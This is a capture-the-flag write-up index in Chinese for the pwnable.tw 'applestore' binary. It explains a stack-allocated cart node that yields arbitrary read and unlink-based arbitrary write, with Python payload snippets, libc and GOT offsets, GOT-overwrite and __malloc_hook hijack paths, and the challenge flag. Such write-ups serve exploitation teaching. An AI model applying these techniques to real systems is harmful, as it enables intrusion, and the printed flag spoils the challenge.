---
tags:
  - stack-pivoting
  - type-confusion
  - arbitrary-write
  - got-overwrite
platform: pwnable.tw
points: 300
arch: i386
libc: glibc-2.23
relro: partial
canary: yes
nx: yes
pie: no
references:
  - https://pwnable.tw/challenge/
description: "把栈上分配的商品节点插入堆管理的购物车双向链表后，删除商品时会产生任意写原语，可通过覆盖 GOT 劫持控制流。"
proof-of-concept: no
---

# applestore — pwnable.tw (300 分)

[← 返回 pwnable.tw 题目索引](README.md)

> `nc chall.pwnable.tw 10104`
>
> Flag: `FLAG{I_th1nk_th4t_you_c4n_jB_1n_1ph0n3_8}`

## 题目概览

一个 32 位苹果设备商店模拟器（i386、Partial RELRO、NX、栈 Canary、无 PIE），基于 glibc 2.23 构建。程序用一个由 `malloc` 分配的设备节点组成的双向链表维护购物车。用户可以列出设备、增删商品、查看购物车并结账。当购物车总额恰好达到 `$7174` 时，会加入一件特殊的 "iPhone 8" —— 但它的节点位于**栈上**，而不是堆上。

```bash
checksec:
  Arch:     i386-32-little
  RELRO:    Partial RELRO        # GOT writable
  Stack:    Canary found
  NX:       NX enabled
  PIE:      No PIE (0x8048000)
```

## 漏洞

### V1 — iPhone 8 节点位于栈上（主要，可利用）

**根因：** `checkout` 函数检查购物车总额是否等于 `$7174`（十六进制 `0x1C06`）。若是，则创建一个**局部栈变量**设备节点并插入链表。`checkout` 返回后，链表仍引用该节点内存，而这块内存此刻已与后续栈帧重叠。

```c
// checkout (simplified)
void checkout() {
    // ...
    if (total == 7174) {
        // iPhone 8 node is a LOCAL variable — lives on stack!
        struct device iphone8;
        iphone8.name = "iPhone 8";
        iphone8.price = 1;
        insert(&myCart, &iphone8);  // inserts stack address into linked list
        printf("You are lucky! Here is a free iPhone 8!\n");
    }
    // iphone8 goes out of scope, but linked list still points to it
}
```

丢番图方程 `199*a + 299*b + 399*c + 499*d = 7174` 有多组解。常见组合：

- 6 个 iPhone 6（$199）+ 20 个 iPhone 6 Plus（$299）
- 16 个 iPhone 6（$199）+ 10 个 iPad Mini 3（$399）

**影响：** `checkout` 返回后，链表中的 iPhone 8 节点与 `handler`/`my_read` 栈帧重叠。后续调用 `cart`（选项 4）或 `delete`（选项 3）时，用户输入会被读入一个与 iPhone 8 节点字段重叠的缓冲区。攻击者由此可以直接控制节点的 `name`、`price`、`next` 和 `prev` 指针。

### V2 — 通过伪造购物车节点任意读（可利用）

**根因：** `cart` 函数（选项 4）用 `my_read(buf, 0x15)` 读取 "y/n" 确认。缓冲区 `buf` 位于 `ebp-0x22`，iPhone 8 节点在同一栈帧的固定偏移处。发送超过 2 字节即可覆盖 iPhone 8 节点的 `name` 指针。

```c
// cart (simplified) — "List Cart"
void cart() {
    char buf[0x15];           // ebp - 0x22
    // ... iPhone 8 node overlaps starting at buf+2
    my_read(buf, 0x15);      // "y\x00" + fake_name_ptr + ...
    if (buf[0] == 'y') {
        // iterates linked list, prints each node->name via printf
        for (node = myCart; node; node = node->next) {
            printf("%d: %s - $%d\n", i, node->name, node->price);
            //                            ^^^^^^^^^^
            //     attacker-controlled pointer → arbitrary read
        }
    }
}
```

**触发：**

```python
cart('y\x00' + p32(target_addr) + p32(0) + p32(0) + p32(0))
# Node 27 prints: "27: <4 bytes at target_addr> - $0"
```

**影响：** 在任意地址做 4 字节任意读。可用于泄露 GOT 表项（→ libc 基址）和 `__environ`（→ 栈地址）。

### V3 — 通过双向链表 unlink 任意写（可利用）

**根因：** `delete` 函数（选项 3）用 `my_read(buf, 0x15)` 读取商品编号。同样的栈重叠依然成立。删除 iPhone 8 节点（编号 27）时，unlink 操作会通过攻击者控制的 `next` 和 `prev` 指针写入：

```c
// delete (simplified)
void delete() {
    char buf[0x15];           // ebp - 0x22
    my_read(buf, 0x15);      // "27" + fake_name + fake_price + fake_next + fake_prev
    // ...
    // Standard doubly-linked list unlink:
    node->prev->next = node->next;   // *(prev + 8) = next
    node->next->prev = node->prev;   // *(next + 12) = prev
}
```

**触发：**

```python
delete('27' + p32(name) + p32(price) + p32(next_val) + p32(prev_val))
# Writes: *(prev + 8) = next_val
#         *(next + 12) = prev_val
```

**影响：** 向任意地址写入任意 4 字节值（伴随一次 4 字节副作用写入）。经典的不安全 unlink 原语。

### V4 — `my_read` 与栈节点重叠（使能条件）

**根因：** `my_read(buf, 0x15)` 恰好读取 21 字节。缓冲区从 `ebp-0x22` 开始，而 iPhone 8 节点的 `name` 字段位于 `ebp-0x20`（缓冲区开头仅 2 字节之后）。因此任何超过 2 字节的输入都会直接覆盖节点结构。

```text
Stack layout in handler/cart/delete:
  ebp-0x22: buf[0]  buf[1]  ← "y\x00" or "27"
  ebp-0x20: name[0] name[1] name[2] name[3]   ← node->name (4 bytes)
  ebp-0x1c: price[0..3]                        ← node->price (4 bytes)
  ebp-0x18: next[0..3]                         ← node->next (4 bytes)
  ebp-0x14: prev[0..3]                         ← node->prev (4 bytes)
  ebp-0x10: ...
```

## 关键数据结构

### 设备节点（16 字节，双向链表）

| 偏移 | 字段 | 类型 |
|------|------|------|
| `0x00` | `name` | `char *`（指向设备名字符串） |
| `0x04` | `price` | `int`（美元价格） |
| `0x08` | `next` | `struct device *`（链表中下一个节点） |
| `0x0c` | `prev` | `struct device *`（链表中上一个节点） |

### 全局状态

| 地址 | 符号 | 说明 |
|------|------|------|
| `0x0804B068` | `myCart` | 购物车链表头（next 指针） |
| `0x0804B06C` | `myCart+4` | 购物车链表尾（prev 指针） |
| `0x0804B070` | `myCart+8` | 首节点指针（用于泄露堆基址） |
| `0x0804B040` | `atoi@GOT` | `atoi` 的 GOT 表项 —— 主要覆盖目标 |
| `0x0804B028` | `puts@GOT` | `puts` 的 GOT 表项 |
| `0x0804B010` | `printf@GOT` | `printf` 的 GOT 表项 |
| `0x0804B00C` | `read@GOT` | `read` 的 GOT 表项 |

## 利用路径

所有解法共享同一组核心原语：触发 iPhone 8 栈节点（V1）、用 `cart` 任意读（V2）、用 `delete` 任意写（V3）。区别在于最终的控制流劫持方式。

---

### 路径 A — 覆盖 EBP → 栈迁移到 GOT → `atoi@GOT` = `system`

**使用占比：** exp.py、138、170、1155、1200、1297、1303、1316、1384、1387、1395、1524、1715、10115、11540、13060、14121、14479、16633 等（最常见）

**步骤：**

1. **购买总额为 $7174 的商品**并结账 → iPhone 8 节点落到栈上。

2. **通过任意读泄露 libc 基址**（V2）：

   ```python
   # Read atoi@GOT (or puts/read/printf)
   cart('y\x00' + p32(atoi_got) + p32(0)*3)
   # Parse node 27's name → 4 bytes = atoi's runtime address
   libc_base = leaked_atoi - libc.symbols['atoi']
   ```

3. **通过 `__environ` 泄露栈地址**：

   ```python
   environ_addr = libc_base + libc.symbols['environ']
   stack_ptr = arbitrary_read(environ_addr)
   # handler's saved EBP = stack_ptr - fixed_offset (typically 0x104 or 260)
   ```

4. **通过 unlink 覆盖 handler 保存的 EBP**（V3）：

   ```python
   # Set handler's saved EBP to point near atoi@GOT
   # After handler's `leave; ret`, EBP becomes atoi_got+0x22
   # Next my_read(buf, 0x15) reads into ebp-0x22 = atoi_got
   delete('27' + p32(name) + p32(0) + p32(atoi_got + 0x22) + p32(saved_ebp - 8))
   ```

5. **用 `system` 覆盖 `atoi@GOT`**：

   ```python
   # handler reads the next menu choice into atoi@GOT
   sendline(p32(system_addr) + ';/bin/sh\x00')
   # or: sendline('sh\x00\x00' + p32(system_addr))
   # atoi(buf) becomes system(buf) → shell
   ```

**关键思路：** `delete`/`handler` 末尾的 `leave; ret` 会执行 `mov esp, ebp; pop ebp`。控制保存的 EBP 后，下一个函数的 `my_read(ebp-0x22, ...)` 就会直接写进 GOT。

**可靠性：** 100% —— 不涉及随机性，泄露完成后所有地址都是确定的。

---

### 路径 B — 通过逐字节 unlink 覆盖 `__malloc_hook`

**使用解法：** 1006、1316（变体）

**步骤：**

1. 与路径 A 相同的准备：购买商品、结账、获取泄露。

2. **删除商品直到只剩 iPhone 8 节点**（编号 1-26）。

3. **反复使用 unlink 原语**逐字节写入 `__malloc_hook`：

   ```python
   # Each unlink writes: *(addr-0xC) = byte_value
   # The "byte_value" comes from an address on the stack/BSS
   # that happens to hold the desired byte at its low position
   for offset in range(4):
       delete('1\x00' + p32(0)*2 + p32(malloc_hook - 0xC + offset) +
              p32(bss_addr_with_correct_byte))
   ```

4. **触发 `malloc`**（例如 `add(1)` → 分配新的设备节点）→ `__malloc_hook` 被调用 → one_gadget → shell。

**可靠性：** 100%，但更复杂 —— 需要找到包含正确字节值的栈/BSS 地址。

---

### 路径 C — 通过 EBP 迁移使用 one-gadget

**使用解法：** 138、1155、1177、1351

与路径 A 相同，但不用 `system` 覆盖 `atoi@GOT`，而是覆盖返回地址或保存的 EBP，重定向到 one_gadget 地址：

```python
# Overwrite saved EBP to pivot stack near a controlled region
delete('27' + p32(0)*2 + p32(ebp - 12) + p32(fake_ebp))
# Next input placed on pivoted stack contains one_gadget address
sendline('6aaa' + p32(one_gadget_addr))
```

---

### 路径 D — 用栈迁移 gadget 覆盖 `puts@GOT`

**使用解法：** 1316（变体）

1. **用 unlink 把 `puts@GOT`** 覆盖为 `add esp, 0x1c; ret` gadget。
2. **在下一次菜单提示时发送 payload**，内容包含 `system` 地址和 `/bin/sh` 参数。
3. 调用 `puts` 时，栈被迁移到受控缓冲区 → 执行 `system("/bin/sh")`。

---

### 路径 E — 基于堆的泄露链

**使用解法：** 1351、1384、10115

这个变体不通过 `__environ` 泄露栈，而是经由堆获取：

1. **泄露堆基址**：通过 `myCart+8`（首节点指针）或 `main_arena` 的 bin。
2. **遍历堆**，在最后一个堆节点的 `next` 指针里找到 iPhone 8 节点的栈地址。
3. **根据找到的栈地址计算保存的 EBP**。

这样无需 `__environ`，但需要了解堆布局。

## 利用原语总结

| 原语 | 来源 | 可靠性 |
|------|------|--------|
| 链表中的栈节点 | V1：结账总额 == 7174 | 确定性 |
| 任意 4 字节读 | V2：伪造 name 指针的 cart | 确定性 |
| 任意 4 字节写 | V3：伪造 next/prev 的 delete unlink | 确定性 |
| libc 基址泄露 | 通过 V2 读 GOT 表项 | 确定性 |
| 栈地址泄露 | 通过 V2 读 `__environ` | 确定性 |
| GOT 覆盖（`atoi`→`system`） | V3 unlink + EBP 迁移 | 确定性 |
| 代码执行 | 经 GOT 劫持的 `system("/bin/sh")` | 确定性 |

## 偏移（pwnable.tw `libc_32.so.6`，glibc 2.23）

```python
# GOT addresses (no PIE)
atoi_got   = 0x0804B040
puts_got   = 0x0804B028
printf_got = 0x0804B010
read_got   = 0x0804B00C

# libc offsets
atoi      = 0x0002d050
system    = 0x0003a940
environ   = 0x001b1dbc
puts      = 0x0005f140
printf    = 0x00049020
read      = 0x000d5980
bin_sh    = 0x00158e8b
one_gadgets = [0x5f065, 0x5f066, 0x3a819]

# Stack offset: environ → handler's saved EBP
environ_to_ebp = 260  # (0x104)
```

## 题解文章

| 文件 | 主要路径 | 关键技术 | 备注 |
|------|----------|----------|------|
| `100.md` | A | 通过 `__libc_start_main@GOT` 泄露、基于堆的栈泄露 | 先删光商品，再经商品 1 泄露 |
| `138.md` | C | Ruby 利用脚本；经 EBP 迁移使用 one_gadget | 用 `environ` 泄露栈 |
| `170.md` | A | 干净的 Python；`atoi@GOT → system` | 简洁的参考实现 |
| `1006.md` | B | 逐字节覆盖 `__malloc_hook` | 用栈/BSS 字节作为写入源 |
| `1155.md` | C | 经 `myCart+8` 的堆→栈泄露 | one_gadget 收尾 |
| `1177.md` | C | 删除 25 个商品后经 EBP 覆盖使用 one_gadget | one_gadget 用法干净 |
| `1200.md` | A | 用 `environ` 获取栈、unlink 把 EBP 迁移到 GOT | 标准路径，`system(";sh")` |
| `1297.md` | A | 用 Z3 解丢番图；经 EBP 迁移 `atoi@GOT → system` | 优雅、注释完善 |
| `1303.md` | A | 两阶段栈泄露（堆遍历 + environ） | 冗长但有教学价值 |
| `1316.md` | D | `puts@GOT → add_esp_0x1c_ret` 栈迁移 gadget | 逐字节覆盖 GOT |
| `1351.md` | E | 经 main_arena 泄露堆 → 遍历堆找栈 | 三阶段泄露链 |
| `1384.md` | E | 经 `myCart+8` 的基于堆的泄露链 | BSS 节点操作 |
| `1387.md` | A | 直接；`read@GOT` 泄露、`environ` 泄露栈 | 干净的参考 |
| `1395.md` | A | 用 `environ`；直接覆盖 EBP 到 GOT+0x22 | 最小利用 |
| `1524.md` | A | 用堆遍历找到栈节点 | 遍历链表找栈地址 |
| `1715.md` | A | 标准的经 EBP 迁移劫持 GOT | `system(";/bin/sh")` |
| `10115.md` | E | 经 main_arena 泄露堆 → 栈地址 | 用堆泄露栈 |
| `11540.md` | A | 固定 21 字节的 `my_read`；巧妙填充 | 使用 `environ` |
| `13060.md` | A | 多字节泄露函数；堆遍历找栈 | 泄露实现完整 |
| `14121.md` | A | 标准；用 `puts@GOT` 泄露 libc、`environ` 泄露栈 | 干净的 pwntools 用法 |
| `16633.md` | A | 19×iPhone6 + 6×iPadAir + 1×iPadMini 丢番图解 | 标准 EBP 迁移 |

## 文件

| 文件 | 说明 |
|------|------|
| `exp.py` | 可用利用脚本（纯 socket，不用 pwntools） |
| `desc.txt` | 题目描述 |
| `artifacts/applestore` | 题目二进制（i386，已 strip） |
| `artifacts/libc_32.so.6` | 远程 libc（glibc 2.23，i386） |
| `solution/*.md` | 社区题解（167 份） |
